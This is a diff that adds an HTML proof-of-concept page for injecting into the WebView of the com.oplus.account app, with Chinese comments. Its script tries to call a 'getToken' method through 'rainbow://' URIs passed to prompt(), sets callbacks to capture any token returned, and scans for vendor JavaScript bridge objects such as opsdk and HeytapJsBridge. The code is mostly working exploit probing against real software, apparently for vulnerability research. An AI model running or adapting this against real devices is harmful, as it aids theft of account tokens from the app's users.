@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AMS WebView注入PoC</title>
+<style>
+  body { font-family: monospace; padding: 12px; background: #0a1628; color: #4da8da; font-size: 12px; word-break: break-all; }
+  h3 { color: #fff; margin: 14px 0 6px; }
+  .ok { color: #22c55e; }
+  .bad { color: #ef4444; }
+  pre { white-space: pre-wrap; background: #111; padding: 8px; border-radius: 6px; margin: 4px 0; }
+  button { padding: 10px; margin: 4px 2px; width: 100%; font-size: 14px; }
+</style>
+</head>
+<body>
+<h2 style="color:#fff">🎯 WebView注入PoC</h2>
+<div id="status">页面加载成功 — <b class="ok">任意URL注入成立</b>（这里不是浏览器，是com.oplus.account的官方webview容器）</div>
+<div id="url">本页URL: <script>document.write(location.href)</script></div>
+<div>UA: <span id="ua"></span></div>
+<hr>
+<h3>JSB探测（点按钮逐个试）</h3>
+<button onclick="tryRainbow()">试 rainbow getToken (prompt通道)</button>
+<pre id="r1">未测</pre>
+<button onclick="trySdk()">试 heytap SDK通道 (window探测)</button>
+<pre id="r2">未测</pre>
+<button onclick="scanBridges()">扫描全部window桥对象</button>
+<pre id="r3">未扫</pre>
+<script>
+document.getElementById('ua').textContent = navigator.userAgent.substring(0, 80);
+
+function log(id, s) { document.getElementById(id).textContent = s; }
+
+function tryRainbow() {
+  // o20/b.a: str.startsWith("rainbow") → Uri.parse → host=类名 path=方法名
+  var formats = [
+    'rainbow://JSCommondMethod/getToken?{}#cb1',
+    'rainbow://JSCommondMethod/getToken#cb2',
+    'rainbow://JSCommondMethod/getToken?{}'
+  ];
+  var out = '';
+  for (var i = 0; i < formats.length; i++) {
+    try {
+      var r = prompt(formats[i]);
+      out += '格式' + (i+1) + ' → ' + (r === null ? 'null(prompt被吞=有拦截器)' : JSON.stringify(r)) + '\n';
+    } catch (e) { out += '格式' + (i+1) + ' 异常: ' + e + '\n'; }
+  }
+  // 回调探测: JsCallback可能通过evaluateJavascript回调全局函数
+  window.cb1 = function() { log('r1', '★回调到达cb1: ' + JSON.stringify([].slice.call(arguments)).substring(0, 300)); };
+  window.cb2 = function() { log('r1', '★回调到达cb2: ' + JSON.stringify([].slice.call(arguments)).substring(0, 300)); };
+  log('r1', out + '（等3秒看回调…）');
+  setTimeout(function() { log('r1', out + '\n(3秒无回调)'); }, 3000);
+}
+
+function trySdk() {
+  var names = ['opsdk', 'OppoWebPage', 'HeytapJsBridge', 'oplus', 'ucweb', 'webext', 'heytap', 'OppoJsApi', 'jsApi'];
+  var found = [];
+  for (var i = 0; i < names.length; i++) {
+    if (window[names[i]] !== undefined) found.push(names[i]);
+  }
+  var out = found.length ? '发现桥: ' + found.join(', ') : '未发现任何SDK桥对象';
+  if (window.opsdk) { try { out += '\nopsdk keys: ' + Object.keys(window.opsdk).join(','); } catch(e){} }
+  log('r2', out);
+}
+
+function scanBridges() {
+  var skip = ['window','document','navigator','location','history','screen','localStorage','sessionStorage','console','performance','alert','confirm','prompt','setTimeout','setInterval','clearTimeout','clearInterval','fetch','XMLHttpRequest','WebSocket','atob','btoa','encodeURIComponent','decodeURIComponent','JSON','Object','Array','String','Number','Boolean','Date','Math','RegExp','Error','Promise','Symbol','Map','Set','WeakMap','WeakSet','Proxy','Reflect','parseInt','parseFloat','isNaN','isFinite','eval','Function','undefined','NaN','Infinity','globalThis','self','top','parent','frames','open','close','stop','focus','blur','print','requestAnimationFrame','cancelAnimationFrame','getComputedStyle','matchMedia','scrollTo','scrollBy','scroll','moveTo','resizeTo','innerWidth','innerHeight','outerWidth','outerHeight','pageXOffset','pageYOffset','screenX','screenY','screenLeft','screenTop','event','origin','name','status','closed','length','opener','crypto','Notification','indexedDB','caches','onload','onerror'];
+  var found = [];
+  try {
+    for (var k in window) {
+      if (skip.indexOf(k) < 0 && window[k] !== null && typeof window[k] === 'object') {
+        found.push(k);
+      }
+    }
+  } catch(e){}
+  log('r3', found.length ? 'window上的可疑对象:\n' + found.join('\n') : '无可疑对象');
+}
+</script>
+</body>
+</html>
